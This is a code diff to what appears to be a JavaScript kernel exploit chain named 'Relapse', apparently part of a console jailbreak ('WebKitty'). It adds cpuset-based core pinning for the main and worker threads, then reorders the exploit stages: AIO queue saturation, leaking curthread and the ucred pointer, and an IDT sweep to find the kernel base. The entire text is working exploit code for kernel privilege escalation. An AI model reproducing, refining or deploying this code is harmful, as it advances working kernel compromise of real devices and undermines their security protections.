@@ -60,7 +60,9 @@ const PR_SWEEP_STEP = 0x1000000;
 const PR_SWEEP = 256;
 const PR_KBASE_ALIGN = 0x4000;
 
-const PR_WORKER_CORE = MAIN_CORE > 0 ? MAIN_CORE - 1 : 1;
+const PR_CPU_LEVEL_WHICH = 3;
+const PR_CPU_WHICH_TID = 1;
+const PR_CPUSET_SZ = 0x10;
 
 const PR_PROT_RW = 3;
 const PR_MAP_PRIVATE = 2;
@@ -96,6 +98,7 @@ fn.aio_multi_wait = new NativeFunction(663, 'number');
 fn.aio_multi_poll = new NativeFunction(664, 'number');
 fn.aio_multi_cancel = new NativeFunction(666, 'number');
 fn.aio_submit_cmd = new NativeFunction(669, 'number');
+fn.cpuset_getaffinity = new NativeFunction(487, 'number');
 //#endregion
 
 //#region State
@@ -129,6 +132,9 @@ let pr_block_buf = undefined;
 let pr_curthread = undefined;
 let pr_ucred = undefined;
 let kernel_base = undefined;
+
+let pr_main_core = undefined;
+let pr_worker_cores = [];
 //#endregion
 
 //#region Basic helpers
@@ -222,6 +228,72 @@ function pr_byte_dec_plan(cur_lo, tgt_lo) {
   }
 
   return pos;
+}
+
+// Read the current thread's 64-bit cpuset mask (low word is enough here).
+function pr_get_affinity(mask_addr) {
+  mem.bset(mask_addr, PR_CPUSET_SZ, 0);
+  if (
+    fn.cpuset_getaffinity.invoke(
+      PR_CPU_LEVEL_WHICH,
+      PR_CPU_WHICH_TID,
+      -1,
+      PR_CPUSET_SZ,
+      mask_addr,
+    ) !== 0
+  ) {
+    throw new SyscallError('Unable to get Relapse CPU affinity !!');
+  }
+  return arw.view(mask_addr).getBInt(0, true).lo >>> 0;
+}
+
+// Pin and verify. A failed readback is treated as a failed pin; WebKitty
+// refuses to run when main and workers cannot be placed on different cores.
+function pr_set_affinity(core, mask_addr) {
+  const want = (1 << core) >>> 0;
+  mem.bset(mask_addr, PR_CPUSET_SZ, 0);
+  arw.view(mask_addr).setUint32(0, want, true);
+
+  if (
+    fn.cpuset_setaffinity.invoke(
+      PR_CPU_LEVEL_WHICH,
+      PR_CPU_WHICH_TID,
+      -1,
+      PR_CPUSET_SZ,
+      mask_addr,
+    ) !== 0
+  ) {
+    return false;
+  }
+
+  return pr_get_affinity(mask_addr) === want;
+}
+
+function pr_select_cores() {
+  const mask_addr = mem.alloc(PR_CPUSET_SZ);
+  const saved = pr_get_affinity(mask_addr);
+  const cores = [];
+
+  for (let i = 0; i < 32; i++) {
+    if ((saved & (1 << i)) !== 0) cores.push(i);
+  }
+  if (cores.length < 2) {
+    throw new Error(`Relapse needs at least two CPUs (mask=0x${saved.toString(16)}) !!`);
+  }
+
+  // Prefer the historical main core, but fall back to any available core.
+  const main = cores.includes(MAIN_CORE) ? MAIN_CORE : cores[0];
+  if (!pr_set_affinity(main, mask_addr)) {
+    throw new Error(`Unable to pin main thread to core ${main} !!`);
+  }
+  mem.free(mask_addr);
+
+  pr_main_core = main;
+  // WebKitty tries candidate worker cores from highest to lowest and requires
+  // a verified set/readback inside each worker before proceeding.
+  pr_worker_cores = cores.filter((c) => c !== main).reverse();
+
+  logger.info(`Relapse CPU pin: main=${pr_main_core}, workers=${pr_worker_cores.join(',')}`);
 }
 //#endregion
 
@@ -423,12 +495,38 @@ async function pr_spawn_workers() {
     await w.execute(
       'register',
       'kinit',
-      `() => {
+      `(cores) => {
         importScripts('kernel.js');
-        pin_to_core(${PR_WORKER_CORE});
+        fn.cpuset_getaffinity = new NativeFunction(487, 'number');
+
+        const CPUSET_SZ = 16;
+        const LEVEL_WHICH = 3;
+        const WHICH_TID = 1;
+        const mask = mem.alloc(CPUSET_SZ);
+        let chosen = -1;
+
+        for (const core of cores) {
+          mem.bset(mask, CPUSET_SZ, 0);
+          arw.view(mask).setUint32(0, (1 << core) >>> 0, true);
+          if (fn.cpuset_setaffinity.invoke(LEVEL_WHICH, WHICH_TID, -1, CPUSET_SZ, mask) !== 0) {
+            continue;
+          }
+
+          mem.bset(mask, CPUSET_SZ, 0);
+          if (fn.cpuset_getaffinity.invoke(LEVEL_WHICH, WHICH_TID, -1, CPUSET_SZ, mask) !== 0) {
+            continue;
+          }
+          if (arw.view(mask).getUint32(0, true) === ((1 << core) >>> 0)) {
+            chosen = core;
+            break;
+          }
+        }
+        mem.free(mask);
+        if (chosen < 0) throw new Error('Unable to pin Relapse worker !!');
+
         set_rtprio(RTP);
         fn.aio_multi_cancel = new NativeFunction(666, 'number');
-        return true;
+        return chosen;
       }`,
     );
     await w.execute(
@@ -451,11 +549,12 @@ async function pr_spawn_workers() {
         }
       }`,
     );
-    await w.execute('kinit');
+    const worker_core = await w.execute('kinit', pr_worker_cores);
+    logger.debug(`Relapse worker ${i} pinned on core ${worker_core} !!`);
     pr_workers[i] = w;
   }
 
-  logger.debug(`Relapse workers pinned on core ${PR_WORKER_CORE} !!`);
+  logger.info('Relapse workers pinned !!');
 }
 
 function pr_arm_once() {
@@ -914,25 +1013,34 @@ async function pr_leak_kernel_base() {
 }
 
 async function pr_exploit_kernel_base() {
-  pin_to_core(MAIN_CORE);
+  pr_select_cores();
   set_rtprio(RTP);
 
+  logger.info('Relapse stage: scratch');
   pr_init_scratch();
 
   pr_node0 = mem.alloc(PR_RTH_SIZE);
   pr_set_node0(0, 0);
 
+  logger.info('Relapse stage: socket pool');
   pr_init_pool();
-  pr_setup_blocking();
-  pr_setup_arm_reqs();
+
+  // WebKitty pins both cancel workers before it saturates the AIO queues.
   await pr_spawn_workers();
 
+  logger.info('Relapse stage: AIO queues');
+  pr_setup_blocking();
+  pr_setup_arm_reqs();
+
+  logger.info('Relapse stage: curthread leak');
   await pr_leak_curthread();
 
+  logger.info('Relapse stage: pointer read');
   const ucred_lo = await pr_read_low_dword(pr_curthread.add(PR_TD_UCRED_OFF));
   pr_ucred = new BInt(pr_curthread.hi, ucred_lo);
   logger.debug(`Relapse ucred: ${pr_ucred}`);
 
+  logger.info('Relapse stage: IDT sweep');
   await pr_leak_kernel_base();
   return { curthread: pr_curthread, ucred: pr_ucred };
 }
